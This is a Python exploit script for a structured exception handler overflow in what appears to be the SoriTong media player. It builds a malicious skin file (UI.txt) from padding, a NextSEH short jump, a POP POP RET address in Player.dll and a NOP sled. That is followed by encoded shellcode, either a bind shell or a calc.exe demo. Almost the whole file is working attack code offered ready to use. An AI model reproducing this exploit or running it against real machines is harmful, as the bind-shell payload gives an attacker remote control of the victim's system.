#!/usr/bin/python

FILE="/tmp/UI.txt" # To replace, ex: "C:\Program Files\SoriTong\Skin\Console\"

def create_file(filename, data):
	with open(filename, "w") as fout:
		fout.write(data)

payload = ""
c_p = "bind"    # Choose payload

if c_p == "bind":
    # bind - bad chars "\x00\x20\x09\x0a\x0d"
    payload += "\xdd\xc1\xbd\xb3\x4f\xb2\xb5\xd9\x74\x24\xf4\x5a\x29"
    payload += "\xc9\xb1\x53\x83\xc2\x04\x31\x6a\x13\x03\xd9\x5c\x50"
    payload += "\x40\xe1\x8b\x16\xab\x19\x4c\x77\x25\xfc\x7d\xb7\x51"
    payload += "\x75\x2d\x07\x11\xdb\xc2\xec\x77\xcf\x51\x80\x5f\xe0"
    payload += "\xd2\x2f\x86\xcf\xe3\x1c\xfa\x4e\x60\x5f\x2f\xb0\x59"
    payload += "\x90\x22\xb1\x9e\xcd\xcf\xe3\x77\x99\x62\x13\xf3\xd7"
    payload += "\xbe\x98\x4f\xf9\xc6\x7d\x07\xf8\xe7\xd0\x13\xa3\x27"
    payload += "\xd3\xf0\xdf\x61\xcb\x15\xe5\x38\x60\xed\x91\xba\xa0"
    payload += "\x3f\x59\x10\x8d\x8f\xa8\x68\xca\x28\x53\x1f\x22\x4b"
    payload += "\xee\x18\xf1\x31\x34\xac\xe1\x92\xbf\x16\xcd\x23\x13"
    payload += "\xc0\x86\x28\xd8\x86\xc0\x2c\xdf\x4b\x7b\x48\x54\x6a"
    payload += "\xab\xd8\x2e\x49\x6f\x80\xf5\xf0\x36\x6c\x5b\x0c\x28"
    payload += "\xcf\x04\xa8\x23\xe2\x51\xc1\x6e\x6b\x95\xe8\x90\x6b"
    payload += "\xb1\x7b\xe3\x59\x1e\xd0\x6b\xd2\xd7\xfe\x6c\x15\xc2"
    payload += "\x47\xe2\xe8\xed\xb7\x2b\x2f\xb9\xe7\x43\x86\xc2\x63"
    payload += "\x93\x27\x17\x19\x9b\x8e\xc8\x3c\x66\x70\xb9\x80\xc8"
    payload += "\x19\xd3\x0e\x37\x39\xdc\xc4\x50\xd2\x21\xe7\x4f\x7f"
    payload += "\xaf\x01\x05\x6f\xf9\x9a\xb1\x4d\xde\x12\x26\xad\x34"
    payload += "\x0b\xc0\xe6\x5e\x8c\xef\xf6\x74\xba\x67\x7d\x9b\x7e"
    payload += "\x96\x82\xb6\xd6\xcf\x15\x4c\xb7\xa2\x84\x51\x92\x54"
    payload += "\x24\xc3\x79\xa4\x23\xf8\xd5\xf3\x64\xce\x2f\x91\x98"
    payload += "\x69\x86\x87\x60\xef\xe1\x03\xbf\xcc\xec\x8a\x32\x68"
    payload += "\xcb\x9c\x8a\x71\x57\xc8\x42\x24\x01\xa6\x24\x9e\xe3"
    payload += "\x10\xff\x4d\xaa\xf4\x86\xbd\x6d\x82\x86\xeb\x1b\x6a"
    payload += "\x36\x42\x5a\x95\xf7\x02\x6a\xee\xe5\xb2\x95\x25\xae"
    payload += "\xcd\x64\xf7\x3b\x59\xdf\x62\x06\x07\xe0\x59\x45\x3e"
    payload += "\x63\x6b\x36\xc5\x7b\x1e\x33\x81\x3b\xf3\x49\x9a\xa9"
    payload += "\xf3\xfe\x9b\xfb"
else:
    # default CALC.EXE - bad chars "\x00\x20\x09\x0a"
    payload += "\xbe\x77\x6d\x1e\xfe\xda\xd6\xd9\x74\x24\xf4\x5b\x2b"
    payload += "\xc9\xb1\x31\x31\x73\x13\x83\xeb\xfc\x03\x73\x78\x8f"
    payload += "\xeb\x02\x6e\xcd\x14\xfb\x6e\xb2\x9d\x1e\x5f\xf2\xfa"
    payload += "\x6b\xcf\xc2\x89\x3e\xe3\xa9\xdc\xaa\x70\xdf\xc8\xdd"
    payload += "\x31\x6a\x2f\xd3\xc2\xc7\x13\x72\x40\x1a\x40\x54\x79"
    payload += "\xd5\x95\x95\xbe\x08\x57\xc7\x17\x46\xca\xf8\x1c\x12"
    payload += "\xd7\x73\x6e\xb2\x5f\x67\x26\xb5\x4e\x36\x3d\xec\x50"
    payload += "\xb8\x92\x84\xd8\xa2\xf7\xa1\x93\x59\xc3\x5e\x22\x88"
    payload += "\x1a\x9e\x89\xf5\x93\x6d\xd3\x32\x13\x8e\xa6\x4a\x60"
    payload += "\x33\xb1\x88\x1b\xef\x34\x0b\xbb\x64\xee\xf7\x3a\xa8"
    payload += "\x69\x73\x30\x05\xfd\xdb\x54\x98\xd2\x57\x60\x11\xd5"
    payload += "\xb7\xe1\x61\xf2\x13\xaa\x32\x9b\x02\x16\x94\xa4\x55"
    payload += "\xf9\x49\x01\x1d\x17\x9d\x38\x7c\x7d\x60\xce\xfa\x33"
    payload += "\x62\xd0\x04\x63\x0b\xe1\x8f\xec\x4c\xfe\x45\x49\xa2"
    payload += "\xb4\xc4\xfb\x2b\x11\x9d\xbe\x31\xa2\x4b\xfc\x4f\x21"
    payload += "\x7e\x7c\xb4\x39\x0b\x79\xf0\xfd\xe7\xf3\x69\x68\x08"
    payload += "\xa0\x8a\xb9\x6b\x27\x19\x21\x42\xc2\x99\xc0\x9a"

pattern = "A" * 584             # Bit of garbage
pattern += "\xEB\x06\x41\x41"   # NextSEH: Jump forward (to our payload)
pattern += "\x84\x4F\x01\x10"   # SEHandler: 0x10014F84 - POP POP RET - Player.dll
pattern += "\x90" * 10          # Ensure that we land safely
pattern += payload              # Payload goes there
pattern += "C" * 500            # Some more garbage (required to trigger SEH)

create_file(FILE, pattern)
